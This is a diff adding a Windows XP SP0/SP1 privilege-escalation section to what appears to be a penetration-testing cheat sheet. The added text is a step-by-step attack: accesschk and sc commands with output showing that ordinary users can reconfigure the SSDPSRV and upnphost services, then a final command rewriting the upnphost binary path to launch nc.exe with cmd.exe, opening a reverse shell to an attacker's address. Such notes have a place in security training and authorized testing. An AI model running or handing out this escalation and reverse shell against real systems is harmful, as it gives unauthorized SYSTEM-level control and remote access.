@@ -269,3 +269,69 @@ https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.p
 /usr/share/wordlists/rockyou.txt
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb
 ```
+* Windows XP SP0/SP1 Privilege Escalation to System
+```
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+# If we are on a Windows XP SP0 or SP1 OS we will receive the following output								 
+RW SSDPSRV
+        SERVICE_ALL_ACCESS
+RW upnphost
+        SERVICE_ALL_ACCESS								 
+accesschk.exe /accepteula -ucqv SSDPSRV
+#Result of SSDPSRV
+SSDPSRV
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\LOCAL SERVICE
+        SERVICE_ALL_ACCESS 
+accesschk.exe /accepteula -ucqv upnphost
+#Result of upnphost
+upnphost
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\Authenticated Users
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Power Users
+        SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\LOCAL SERVICE
+        SERVICE_ALL_ACCESS	
+sc qc SSDPSRV
+#Result
+[SC] GetServiceConfig SUCCESS
+SERVICE_NAME: SSDPSRV
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+	       START_TYPE         : 4   DISABLED
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService  
+        LOAD_ORDER_GROUP   :   
+        TAG                : 0  
+        DISPLAY_NAME       : SSDP Discovery Service   
+        DEPENDENCIES       :   
+        SERVICE_START_NAME : NT AUTHORITY\LocalService			
+sc qc upnphost
+#Result
+[SC] GetServiceConfig SUCCESS
+SERVICE_NAME: upnphost
+        TYPE               : 20  WIN32_SHARE_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\WINDOWS\System32\svchost.exe -k LocalService
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Universal Plug and Play Device Host
+       	DEPENDENCIES       : SSDPSRV
+        SERVICE_START_NAME : NT AUTHORITY\LocalService		
+sc config SSDPSRV start= auto
+#Result
+[SC] ChangeServiceConfig SUCCESS
+net start SSDPSRV
+sc config upnphost binpath= "C:\nc.exe -nv [ip] [port] -e C:\WINDOWS\System32\cmd.exe"
+```
